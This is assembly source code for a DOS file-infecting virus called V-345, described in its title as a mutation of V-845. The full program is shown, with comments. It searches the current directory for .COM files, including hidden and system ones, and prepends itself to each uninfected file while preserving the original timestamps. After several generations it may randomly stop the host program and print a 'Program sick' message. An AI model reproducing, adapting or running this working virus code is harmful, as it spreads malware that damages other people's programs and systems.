	page	,132
	name	V345
	title	V-345 - a mutation of the V-845 virus
	.radix	16
code	segment
	assume	cs:code,ds:code
	org	100

timer	equ	6C
dta	equ	80
ftime	equ	offset dta + 16
fdate	equ	offset dta + 18
fname	equ	offset dta + 1E
virlen	=	offset endcode - offset start
newid	=	offset ident - offset start

start:
	jmp	short virus

ident	dw	'VI'
counter db	0
allcom	db	'*.COM',0
progbeg dd	?
eof	dw	?

virus:
	push	ax
	mov	ax,cs		;Move program code
	add	ax,1000 	; 64K bytes forward
	mov	es,ax
	inc	[counter]
	mov	si,offset start
	xor	di,di
	mov	cx,virlen
	rep	movsb

	mov	dx,offset allcom	;Search for '*.COM' files
	mov	cx,110b 	;Normal, Hidden or System
	mov	ah,4E		;Find First file
	int	21
	jc	done		;Quit if none found

mainlp:
	mov	dx,fname
	mov	ax,3D02 	;Open file in Read/Write mode
	int	21
	mov	bx,ax		; Save handle
	push	es
	pop	ds
	mov	dx,virlen
	mov	cx,0FFFF	;Read all bytes (64K max in .COM file)
	mov	ah,3F		;Read from handle
	int	21		;Bytes read in AX
	add	ax,virlen
	mov	cs:[eof],ax	;Save pointer to the end of file
	cmp	ds:[newid+virlen],'VI'  ;Infected?
	je	close		;Go find next file if so

	xor	cx,cx		;Go to file beginning
	mov	dx,cx
	mov	ax,4200 	;LSEEK from the beginning of the file
	int	21
	jc	close		;Leave this file if error occures

	xor	dx,dx		;Write the whole code (virus+file)
	mov	cx,cs:[eof]	; back onto the file
	mov	ah,40		;Write to handle
	int	21

	mov	cx,cs:[ftime]
	mov	dx,cs:[fdate]
	mov	ax,5701 	;Set file date/time
	int	21

close:
	mov	ah,3E		;Close the file
	int	21

	push	cs
	pop	ds		;Restore DS
	mov	ah,4F		;Find next matching file
	int	21
	jc	done		;Exit if all found
	jmp	mainlp		;Otherwise loop again

done:
	cmp	[counter],5	;If counter goes above 5,
	jb	progok		; the program becomes "sick"
	mov	ax,40
	mov	ds,ax		;Get the system timer value
	mov	ax,word ptr ds:[timer]
	push	cs
	pop	ds		;Restore DS
	and	ax,1		;At random (if timer value is odd)
	jz	progok		; display the funny message
	mov	dx,offset message
	mov	ah,9		;Print string
	int	21
	int	20		;Terminate program

message db	'Program sick error:Call doctor or '
	db	'buy PIXEL for cure description',0A,0Dh,'$'

progok:
	mov	si,offset transf	;Move this part of code
	mov	cx,offset endcode - offset transf	;Code length
	xor	di,di		;Move to ES:0
	rep	movsb		;Do it

	pop	bx		; BX = old AX
	mov	word ptr cs:[progbeg],0
	mov	word ptr cs:[progbeg+2],es	;Point progbeg at program start
	jmp	cs:[progbeg]	;Jump at program start

transf:
	push	ds
	pop	es
	mov	si,offset endcode
	mov	di,offset start
	mov	cx,0FFFF	;Restore original program's code
	sub	cx,si
	rep	movsb
	mov	word ptr cs:[start],offset start
	mov	word ptr cs:[start+2],ds
	mov	ax,bx
	jmp	dword ptr cs:[start]	;Jump to program start
endcode label	byte

	int	20		;Dummy program

code	ends
	end	start
